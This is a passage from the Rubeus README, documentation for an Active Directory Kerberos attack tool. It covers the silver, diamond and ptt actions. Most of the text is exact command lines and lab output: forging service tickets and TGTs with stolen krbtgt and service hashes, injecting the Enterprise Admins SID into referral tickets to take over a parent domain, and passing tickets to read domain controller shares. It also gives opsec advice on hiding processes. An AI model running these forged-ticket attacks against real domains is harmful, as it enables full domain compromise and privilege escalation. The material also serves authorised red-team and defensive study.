'(|(objectsid=S-1-5-21-3237111427-1607930709-3979055039-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'\r\n    [*] Attempting to mount: \\\\pdc1.rubeus.ghostpack.local\\SYSVOL\r\n    [*] \\\\pdc1.rubeus.ghostpack.local\\SYSVOL successfully mounted\r\n    [*] Attempting to unmount: \\\\pdc1.rubeus.ghostpack.local\\SYSVOL\r\n    [*] \\\\pdc1.rubeus.ghostpack.local\\SYSVOL successfully unmounted\r\n    [*] Retrieving netbios name information over LDAP from domain controller PDC1.rubeus.ghostpack.local\r\n    [*] Searching path 'CN=Configuration,DC=rubeus,DC=ghostpack,DC=local' for '(&(netbiosname=*)(dnsroot=rubeus.ghostpack.local))'\r\n    [*] Building PAC\r\n\r\n    [*] Domain         : RUBEUS.GHOSTPACK.LOCAL (RUBEUS)\r\n    [*] SID            : S-1-5-21-3237111427-1607930709-3979055039\r\n    [*] UserId         : 1106\r\n    [*] Groups         : 513\r\n    [*] ServiceKey     : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5\r\n    [*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n    [*] KDCKey         : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5\r\n    [*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n    [*] Service        : krbtgt\r\n    [*] Target         : rubeus.ghostpack.local\r\n\r\n    [*] Generating EncTicketPart\r\n    [*] Signing PAC\r\n    [*] Encrypting EncTicketPart\r\n    [*] Generating Ticket\r\n    [*] Generated KERB-CRED\r\n    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'\r\n\r\n    [*] AuthTime       : 29/07/2021 00:22:38\r\n    [*] StartTime      : 29/07/2021 00:22:38\r\n    [*] EndTime        : 29/07/2021 10:22:38\r\n    [*] RenewTill      : 05/08/2021 00:22:38\r\n\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs\r\n\r\n\r\n    [*] Generating EncTicketPart\r\n    [*] Signing PAC\r\n    [*] Encrypting EncTicketPart\r\n    [*] Generating Ticket\r\n    [*] Generated KERB-CRED\r\n    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'\r\n\r\n    [*] AuthTime       : 30/07/2021 00:22:38\r\n    [*] StartTime      : 30/07/2021 00:22:38\r\n    [*] EndTime        : 30/07/2021 10:22:38\r\n    [*] RenewTill      : 06/08/2021 00:22:38\r\n\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs\r\n\r\n\r\n    [*] Generating EncTicketPart\r\n    [*] Signing PAC\r\n    [*] Encrypting EncTicketPart\r\n    [*] Generating Ticket\r\n    [*] Generated KERB-CRED\r\n    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'\r\n\r\n    [*] AuthTime       : 31/07/2021 00:22:38\r\n    [*] StartTime      : 31/07/2021 00:22:38\r\n    [*] EndTime        : 31/07/2021 10:22:38\r\n    [*] RenewTill      : 07/08/2021 00:22:38\r\n\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs\r\n\r\n\r\n    [*] Generating EncTicketPart\r\n    [*] Signing PAC\r\n    [*] Encrypting EncTicketPart\r\n    [*] Generating Ticket\r\n    [*] Generated KERB-CRED\r\n    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'\r\n\r\n    [*] AuthTime       : 01/08/2021 00:22:38\r\n    [*] StartTime      : 01/08/2021 00:22:38\r\n    [*] EndTime        : 01/08/2021 10:22:38\r\n    [*] RenewTill      : 08/08/2021 00:22:38\r\n\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs\r\n\r\n\r\n    [*] Generating EncTicketPart\r\n    [*] Signing PAC\r\n    [*] Encrypting EncTicketPart\r\n    [*] Generating Ticket\r\n    [*] Generated KERB-CRED\r\n    [*] Forged a TGT for 'harmj0y@rubeus.ghostpack.local'\r\n\r\n    [*] AuthTime       : 02/08/2021 00:22:38\r\n    [*] StartTime      : 02/08/2021 00:22:38\r\n    [*] EndTime        : 02/08/2021 10:22:38\r\n    [*] RenewTill      : 09/08/2021 00:22:38\r\n\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFdTCCBXGgAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          dWJldXMuZ2hvc3RwYWNrLmxvY2Fs\r\n\r\n### silver\r\n\r\nThe **silver** action will forge a ticket for the user `/user:X` and service `/service:SPN`, encrypting the ticket with the hash passed with `/des:X`, `/rc4:X`, `/aes128:X` or `/aes256:X` and using the same key to create the ServerChecksum. If the `/krbkey:X` argument is passed this will be used to create the KDCChecksum and TicketChecksum (if the service is not **krbtgt/domain.com** or **domain.com** is different to the from the realm used within the ticket, ie. it is a referral ticket), otherwise the same key used to encrypt the ticket is used. If `krbenctype:X` is not passed, the same encryption type used by the service key is assumed for the KDCChecksum and TicketChecksum.\r\n\r\nThe `/cname:X` and `/crealm:X` arguments can be used to set different values for those fields within the EncTicketPart (encrypted part of the ticket), this is sometimes seen within referral delegation tickets. A S4UDelegationInfo PAC section can be added by passing the `/s4uproxytarget:X` and `/s4utransitedservices:SPN1,SPN2,...` arguments, this section provides a final target for delegation and the list of SPNs the delegation has happened through.\r\n\r\nThe `/authdata` flag can be used to add some generic Authorization Data sections to the EncTicketPart, by default this will include a *KERB-LOCAL* section and a *KERB-AD-RESTRICTION-ENTRY* section with some default values.\r\n\r\nThe `/nofullpacsig` flag will **exclude** the new *FullPacChecksum*, [introduced](https://support.microsoft.com/en-gb/topic/kb5020805-how-to-manage-kerberos-protocol-changes-related-to-cve-2022-37967-997e9acc-67c5-48e1-8d0d-190269bf4efb) to resolve the [CVE-2022-37967](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-37967) vulnerability. This signature is included by default in any tickets not secured with the krbtgt key.\r\n\r\nForging a service ticket to **cifs/SQL1.rubeus.ghostpack.local** for the user **ccob** using the services *RC4* password hash and signing the KDCChecksum and TicketChecksum with the proper KRBTGT *AES256* key, using LDAP with alternate credentials to get the PAC information:\r\n\r\n    C:\\Rubeus>dir \\\\SQL1.rubeus.ghostpack.local\\c$\r\n    The user name or password is incorrect.\r\n\r\n    C:\\Rubeus>Rubeus.exe silver /service:cifs/SQL1.rubeus.ghostpack.local /rc4:f74b07eb77caa52b8d227a113cb649a6 /ldap /creduser:rubeus.ghostpack.local\\Administrator /credpassword:Password1 /user:ccob /krbkey:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd47a10ae3d5 /krbenctype:aes256 /domain:rubeus.ghostpack.local /ptt\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Build TGS\r\n\r\n    [*] Trying to query LDAP using LDAPS for user information on domain controller PDC1.rubeus.ghostpack.local\r\n    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(samaccountname=ccob)'\r\n    [*] Retrieving group and domain policy information over LDAP from domain controller PDC1.rubeus.ghostpack.local\r\n    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(|(distinguishedname=CN=Domain Admins,CN=Users,DC=rubeus,DC=ghostpack,DC=local)(objectsid=S-1-5-21-3237111427-1607930709-3979055039-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'\r\n    [*] Attempting to mount: \\\\pdc1.rubeus.ghostpack.local\\SYSVOL\r\n    [*] \\\\pdc1.rubeus.ghostpack.local\\SYSVOL successfully mounted\r\n    [*] Attempting to unmount: \\\\pdc1.rubeus.ghostpack.local\\SYSVOL\r\n    [*] \\\\pdc1.rubeus.ghostpack.local\\SYSVOL successfully unmounted\r\n    [*] Retrieving netbios name information over LDAP from domain controller PDC1.rubeus.ghostpack.local\r\n    [!] Unable to query forest root using System.DirectoryServices.ActiveDirectory.Forest, assuming rubeus.ghostpack.local is the forest root\r\n    [*] Searching path 'CN=Configuration,DC=rubeus,DC=ghostpack,DC=local' for '(&(netbiosname=*)(dnsroot=rubeus.ghostpack.local))'\r\n    [*] Building PAC\r\n\r\n    [*] Domain         : RUBEUS.GHOSTPACK.LOCAL (RUBEUS)\r\n    [*] SID            : S-1-5-21-3237111427-1607930709-3979055039\r\n    [*] UserId         : 1109\r\n    [*] Groups         : 512,513\r\n    [*] ServiceKey     : F74B07EB77CAA52B8D227A113CB649A6\r\n    [*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5\r\n    [*] KDCKey         : 6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5\r\n    [*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256\r\n    [*] Service        : cifs\r\n    [*] Target         : SQL1.rubeus.ghostpack.local\r\n\r\n    [*] Generating EncTicketPart\r\n    [*] Signing PAC\r\n    [*] Encrypting EncTicketPart\r\n    [*] Generating Ticket\r\n    [*] Generated KERB-CRED\r\n    [*] Forged a TGS for 'ccob' to 'cifs/SQL1.rubeus.ghostpack.local'\r\n\r\n    [*] AuthTime       : 29/07/2021 01:00:23\r\n    [*] StartTime      : 29/07/2021 01:00:23\r\n    [*] EndTime        : 29/07/2021 11:00:23\r\n    [*] RenewTill      : 05/08/2021 01:00:23\r\n\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFZTCCBWGgAwIBBaEDAgEWooIESDCCBERhggRAMIIEPKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          bG9jYWw=\r\n\r\n\r\n    [+] Ticket successfully imported!\r\n\r\n    C:\\Rubeus>dir \\\\SQL1.rubeus.ghostpack.local\\c$\r\n     Volume in drive \\\\SQL1.rubeus.ghostpack.local\\c$ has no label.\r\n     Volume Serial Number is 1AD6-20BE\r\n    \r\n     Directory of \\\\SQL1.rubeus.ghostpack.local\\c$\r\n\r\n    15/09/2018  08:19    <DIR>          PerfLogs\r\n    20/07/2021  18:17    <DIR>          Program Files\r\n    20/07/2021  18:17    <DIR>          Program Files (x86)\r\n    21/07/2021  01:53    <DIR>          Rubeus\r\n    20/07/2021  21:02    <DIR>          temp\r\n    20/07/2021  22:31    <DIR>          Users\r\n    20/07/2021  18:18    <DIR>          Windows\r\n                   0 File(s)              0 bytes\r\n                   7 Dir(s)  124,275,159,040 bytes free\r\n\r\nForging a referral TGT for a trusting domain, using LDAP to retrieve the PAC information:\r\n\r\n    C:\\Rubeus>Rubeus.exe silver /user:exploitph /ldap /service:krbtgt/dev.rubeus.ghostpack.local /rc4:856a1023055848748e7b9d505ebe0e02\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Build TGS\r\n\r\n    [*] Trying to query LDAP using LDAPS for user information on domain controller PDC1.rubeus.ghostpack.local\r\n    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(samaccountname=exploitph)'\r\n    [*] Retrieving domain policy information over LDAP from domain controller PDC1.rubeus.ghostpack.local\r\n    [*] Searching path 'DC=rubeus,DC=ghostpack,DC=local' for '(|(objectsid=S-1-5-21-3237111427-1607930709-3979055039-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'\r\n    [*] Attempting to mount: \\\\pdc1.rubeus.ghostpack.local\\SYSVOL\r\n    [*] \\\\pdc1.rubeus.ghostpack.local\\SYSVOL successfully mounted\r\n    [*] Attempting to unmount: \\\\pdc1.rubeus.ghostpack.local\\SYSVOL\r\n    [*] \\\\pdc1.rubeus.ghostpack.local\\SYSVOL successfully unmounted\r\n    [*] Retrieving netbios name information over LDAP from domain controller PDC1.rubeus.ghostpack.local\r\n    [*] Searching path 'CN=Configuration,DC=rubeus,DC=ghostpack,DC=local' for '(&(netbiosname=*)(dnsroot=rubeus.ghostpack.local))'\r\n    [*] Building PAC\r\n\r\n    [*] Domain         : RUBEUS.GHOSTPACK.LOCAL (RUBEUS)\r\n    [*] SID            : S-1-5-21-3237111427-1607930709-3979055039\r\n    [*] UserId         : 1104\r\n    [*] Groups         : 513\r\n    [*] ServiceKey     : 856A1023055848748E7B9D505EBE0E02\r\n    [*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5\r\n    [*] KDCKey         : 856A1023055848748E7B9D505EBE0E02\r\n    [*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5\r\n    [*] Service        : krbtgt\r\n    [*] Target         : dev.rubeus.ghostpack.local\r\n\r\n    [*] Generating EncTicketPart\r\n    [*] Signing PAC\r\n    [*] Encrypting EncTicketPart\r\n    [*] Generating Ticket\r\n    [*] Generated KERB-CRED\r\n    [*] Forged a TGT for 'exploitph@rubeus.ghostpack.local'\r\n\r\n    [*] AuthTime       : 29/07/2021 02:45:54\r\n    [*] StartTime      : 29/07/2021 02:45:54\r\n    [*] EndTime        : 29/07/2021 12:45:54\r\n    [*] RenewTill      : 05/08/2021 02:45:54\r\n\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFojCCBZ6gAwIBBaEDAgEWooIEfjCCBHphggR2MIIEcqADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                            ...(snip)...\r\n          LmxvY2Fs\r\n\r\nThis ticket can then be used to request service tickets on the trusting domain using `asktgs`:\r\n\r\n    C:\\Rubeus>Rubeus.exe asktgs /service:cifs/devdc1.dev.rubeus.ghostpack.local /dc:devdc1.dev.rubeus.ghostpack.local /ticket:doIFojCCBZ6gAwIBBa...(snip)...NrLmxvY2Fs\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Ask TGS\r\n\r\n    [*] Using domain controller: devdc1.dev.rubeus.ghostpack.local (192.168.71.85)\r\n    [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket\r\n    [*] Building TGS-REQ request for: 'cifs/devdc1.dev.rubeus.ghostpack.local'\r\n    [+] TGS request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFrzCCBaugAwIBBaEDAgEWooIEgzCCBH9hggR7MIIEd6ADAgEFoRwbGkRFVi5SVUJFVVMuR0hPU1RQ\r\n                                            ...(snip)...\r\n          ZXVzLmdob3N0cGFjay5sb2NhbA==\r\n\r\n      ServiceName              :  cifs/devdc1.dev.rubeus.ghostpack.local\r\n      ServiceRealm             :  DEV.RUBEUS.GHOSTPACK.LOCAL\r\n      UserName                 :  exploitph\r\n      UserRealm                :  RUBEUS.GHOSTPACK.LOCAL\r\n      StartTime                :  29/07/2021 02:51:05\r\n      EndTime                  :  29/07/2021 12:45:54\r\n      RenewTill                :  05/08/2021 02:45:54\r\n      Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable\r\n      KeyType                  :  aes256_cts_hmac_sha1\r\n      Base64(key)              :  v1Bnp3plKCePeRpg1hrtYkI7bPDk6vw5uoj5MBNSThw=\r\n\r\nForge a referral TGT for **dev.ccob@dev.rubeus.ghostpack.local** for the parent domain **rubeus.ghostpack.local** and include the SID of the Enterprise Admins group:\r\n\r\n    C:\\Rubeus>Rubeus.exe silver /user:dev.ccob /ldap /service:krbtgt/rubeus.ghostpack.local /rc4:856a1023055848748e7b9d505ebe0e02 /sids:S-1-5-21-3237111427-1607930709-3979055039-519 /nowrap\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Build TGS\r\n\r\n    [*] Trying to query LDAP using LDAPS for user information on domain controller DevDC1.dev.rubeus.ghostpack.local\r\n    [*] Searching path 'DC=dev,DC=rubeus,DC=ghostpack,DC=local' for '(samaccountname=dev.ccob)'\r\n    [*] Retrieving domain policy information over LDAP from domain controller DevDC1.dev.rubeus.ghostpack.local\r\n    [*] Searching path 'DC=dev,DC=rubeus,DC=ghostpack,DC=local' for '(|(objectsid=S-1-5-21-2065789546-4129202522-221898516-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'\r\n    [*] Attempting to mount: \\\\devdc1.dev.rubeus.ghostpack.local\\SYSVOL\r\n    [*] \\\\devdc1.dev.rubeus.ghostpack.local\\SYSVOL successfully mounted\r\n    [*] Attempting to unmount: \\\\devdc1.dev.rubeus.ghostpack.local\\SYSVOL\r\n    [*] \\\\devdc1.dev.rubeus.ghostpack.local\\SYSVOL successfully unmounted\r\n    [*] Retrieving netbios name information over LDAP from domain controller DevDC1.dev.rubeus.ghostpack.local\r\n    [*] Searching path 'CN=Configuration,DC=rubeus,DC=ghostpack,DC=local' for '(&(netbiosname=*)(dnsroot=dev.rubeus.ghostpack.local))'\r\n    [*] Building PAC\r\n\r\n    [*] Domain         : DEV.RUBEUS.GHOSTPACK.LOCAL (DEV)\r\n    [*] SID            : S-1-5-21-2065789546-4129202522-221898516\r\n    [*] UserId         : 1107\r\n    [*] Groups         : 513\r\n    [*] ExtraSIDs      : S-1-5-21-3237111427-1607930709-3979055039-519\r\n    [*] ServiceKey     : 856A1023055848748E7B9D505EBE0E02\r\n    [*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5\r\n    [*] KDCKey         : 856A1023055848748E7B9D505EBE0E02\r\n    [*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5\r\n    [*] Service        : krbtgt\r\n    [*] Target         : rubeus.ghostpack.local\r\n\r\n    [*] Generating EncTicketPart\r\n    [*] Signing PAC\r\n    [*] Encrypting EncTicketPart\r\n    [*] Generating Ticket\r\n    [*] Generated KERB-CRED\r\n    [*] Forged a TGT for 'dev.ccob@dev.rubeus.ghostpack.local'\r\n\r\n    [*] AuthTime       : 29/07/2021 03:03:34\r\n    [*] StartTime      : 29/07/2021 03:03:34\r\n    [*] EndTime        : 29/07/2021 13:03:34\r\n    [*] RenewTill      : 05/08/2021 03:03:34\r\n\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIF0TCCBc2gAwIBBaEDAgEWooIEqTCCBKVhggShMIIEnaADAgEFoRwbGkRFVi5SVUJFVVMuR0hPU1RQ\r\n                                            ...(snip)...\r\n          G9zdHBhY2subG9jYWw=\r\n\r\nThis referral TGT can then be used to request service tickets for services in **rubeus.ghostpack.local** using the [asktgs](#asktgs) command and gain the privileges of the Enterprise Admins group:\r\n\r\n    C:\\Rubeus>Rubeus.exe asktgs /service:cifs/pdc1.rubeus.ghostpack.local /dc:pdc1.rubeus.ghostpack.local /ptt /ticket:doIF0TCCBc2gAwIBBaE...(snip)...cy5naG9zdHBhY2subG9jYWw=\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Ask TGS\r\n\r\n    [*] Using domain controller: pdc1.rubeus.ghostpack.local (192.168.71.80)\r\n    [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket\r\n    [*] Building TGS-REQ request for: 'cifs/pdc1.rubeus.ghostpack.local'\r\n    [+] TGS request successful!\r\n    [+] Ticket successfully imported!\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIF9zCCBfOgAwIBBaEDAgEWooIE1DCCBNBhggTMMIIEyKADAgEFoRgbFlJVQkVVUy5HSE9TVFBBQ0su\r\n                                             ...(snip)...\r\n          ZnMbG3BkYzEucnViZXVzLmdob3N0cGFjay5sb2NhbA==\r\n\r\n      ServiceName              :  cifs/pdc1.rubeus.ghostpack.local\r\n      ServiceRealm             :  RUBEUS.GHOSTPACK.LOCAL\r\n      UserName                 :  dev.ccob\r\n      UserRealm                :  DEV.RUBEUS.GHOSTPACK.LOCAL\r\n      StartTime                :  29/07/2021 03:04:26\r\n      EndTime                  :  29/07/2021 13:03:34\r\n      RenewTill                :  05/08/2021 03:03:34\r\n      Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable\r\n      KeyType                  :  aes256_cts_hmac_sha1\r\n      Base64(key)              :  lQGdcWT5/cacHGFko3fDJvF9poFK+tH5hctlDN89peY=\r\n\r\n\r\n\r\n    C:\\Rubeus>dir \\\\pdc1.rubeus.ghostpack.local\\c$\r\n     Volume in drive \\\\pdc1.rubeus.ghostpack.local\\c$ has no label.\r\n     Volume Serial Number is 3C5F-0EF1\r\n\r\n     Directory of \\\\pdc1.rubeus.ghostpack.local\\c$\r\n\r\n    30/06/2021  02:13    <DIR>          inetpub\r\n    15/09/2018  08:19    <DIR>          PerfLogs\r\n    09/06/2021  17:45    <DIR>          Program Files\r\n    09/06/2021  17:45    <DIR>          Program Files (x86)\r\n    14/07/2021  01:18    <DIR>          Rubeus\r\n    19/07/2021  20:48    <DIR>          temp\r\n    30/06/2021  02:14    <DIR>          Users\r\n    14/07/2021  02:17    <DIR>          Windows\r\n                   0 File(s)              0 bytes\r\n                   8 Dir(s)  94,901,772,288 bytes free\r\n\r\n### diamond\r\n\r\nThe **diamond** action will forge a diamond TGT by modifying a TGT requested for a user using the given arguments. First a TGT will be requested for the specified user and encryption key (`/rc4`, `/aes128`, `/aes256`, or `/des`). A `/password` flag can also be used instead of a hash - in this case `/enctype:X` will default to RC4 for the exchange, with `des|aes128|aes256` as options. Alternatively, PKINIT authentication is supported with the `/certificate:X` argument. When the private key within the PFX file is password protected, this password can be passed with the `/password:X` argument. Lastly, the `/tgtdeleg` flag can be passed to request a TGT using the tgtdeleg trick. The `/krbkey:X` argument is used to decrypt the ticket, resign it after the changes have been made, and rencrypt the ticket.\r\n\r\nIf no `/domain` is specified, the computer's current domain is extracted, and if no `/dc` is specified the same is done for the system's current domain controller. The `/ptt` flag will \"pass-the-ticket\" and apply the resulting Kerberos credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.\r\n\r\nNote that no elevated privileges are needed on the host to request TGTs or apply them to the **current** logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the `/ptt` option. A workaround is to use the `/createnetonly:C:\\X.exe` parameter (which hides the process by default unless the `/show` flag is specified), or request the ticket and apply it to another logon session with `ptt /luid:0xA..`.\r\n\r\nThe `/ticketuser:X` argument is used to specify the username to be used within the modified ticket, `/ticketuserid:#` to specify the user's RID, `/groups:RID1,RID2...` to specify the groups for the ticket and `/sids:SID1,SID2...` to specify the SIDs to be included in the ExtraSIDs field.\r\n\r\nCreating a diamond TGT using a username and password:\r\n\r\n    C:\\Rubeus>Rubeus.exe diamond /krbkey:3111b43b220d2f4eb8e68fe7be1179ce69328c9071cba14bef4dbb02b1cfeb9c /user:loki /password:Mischief$ /enctype:aes /domain:marvel.local /dc:earth-dc.marvel.local /ticketuser:thor /ticketuserid:1104 /groups:512\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.1.1\r\n\r\n    [*] Action: Diamond Ticket\r\n\r\n    [*] Using domain controller: earth-dc.marvel.local (10.1.1.11)\r\n    [!] Pre-Authentication required!\r\n    [!]     AES256 Salt: MARVEL.LOCALloki\r\n    [*] Using aes256_cts_hmac_sha1 hash: 8A90D4F4E8698E76FA014C97A539C1083EDDCB5A281B1274568758FB999DFCE7\r\n    [*] Building AS-REQ (w/ preauth) for: 'marvel.local\\loki'\r\n    [*] Using domain controller: 10.1.1.11:88\r\n    [+] TGT request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFejCCBXagAwIBBaEDAgEWooIEgzCCBH9hggR7MIIEd6ADAgEFoQ4bDE1BUlZFTC5MT0NBTKIhMB+g\r\n                                            ...(snip)...\r\n          oRgwFhsGa3JidGd0GwxNQVJWRUwuTE9DQUw=\r\n\r\n    [*] Decrypting TGT\r\n    [*] Retreiving PAC\r\n    [*] Modifying PAC\r\n    [*] Signing PAC\r\n    [*] Encrypting Modified TGT\r\n\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFajCCBWagAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoQ4bDE1BUlZFTC5MT0NBTKIhMB+g\r\n                                            ...(snip)...\r\n          UlZFTC5MT0NBTA==\r\n\r\nCreating a diamond TGT using the tgtdeleg trick:\r\n\r\n    C:\\Rubeus>Rubeus.exe diamond /krbkey:3111b43b220d2f4eb8e68fe7be1179ce69328c9071cba14bef4dbb02b1cfeb9c /tgtdeleg /ticketuser:thor /ticketuserid:1104 /groups:512\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.1.1\r\n\r\n    [*] Action: Diamond Ticket\r\n\r\n    [*] No target SPN specified, attempting to build 'cifs/dc.domain.com'\r\n    [*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/Earth-DC.marvel.local'\r\n    [+] Kerberos GSS-API initialization success!\r\n    [+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.\r\n    [*] Found the AP-REQ delegation ticket in the GSS-API output.\r\n    [*] Authenticator etype: aes256_cts_hmac_sha1\r\n    [*] Extracted the service ticket session key from the ticket cache: imNrWVWRhlB61dUk5EWEdQL7DgqBQ/UckUs9pBvw6JU=\r\n    [+] Successfully decrypted the authenticator\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFejCCBXagAwIBBaEDAgEWooIEgzCCBH9hggR7MIIEd6ADAgEFoQ4bDE1BUlZFTC5MT0NBTKIhMB+g\r\n                                            ...(snip)...\r\n          oRgwFhsGa3JidGd0GwxNQVJWRUwuTE9DQUw=\r\n\r\n    [*] Decrypting TGT\r\n    [*] Retreiving PAC\r\n    [*] Modifying PAC\r\n    [*] Signing PAC\r\n    [*] Encrypting Modified TGT\r\n\r\n    [*] base64(ticket.kirbi):\r\n\r\n          doIFajCCBWagAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoQ4bDE1BUlZFTC5MT0NBTKIhMB+g\r\n                                            ...(snip)...\r\n          UlZFTC5MT0NBTA==\r\n\r\n\r\n## Ticket Management\r\n\r\nBreakdown of the ticket management commands:\r\n\r\n| Command     | Description |\r\n| ----------- | ----------- |\r\n| [ptt](#ptt) | Apply a ticket to the current (or specified) logon session |\r\n| [purge](#purge) | Purge the current (or specified) logon session of Kerberos tickets |\r\n| [describe](#describe) | Describe a ticket base64 blob or .kirbi file |\r\n\r\n\r\n### ptt\r\n\r\nThe **ptt** action will submit a `/ticket:X` (TGT or service ticket) for the current logon session through the LsaCallAuthenticationPackage() API with a KERB_SUBMIT_TKT_REQUEST message, or (**if elevated**) to the logon session specified by `/luid:0xA..`. Like other `/ticket:X` parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.\r\n\r\n    C:\\Rubeus>Rubeus.exe ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n    [*] Action: Import Ticket\r\n    [+] Ticket successfully imported!\r\n\r\n    C:\\Rubeus>Rubeus.exe klist\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  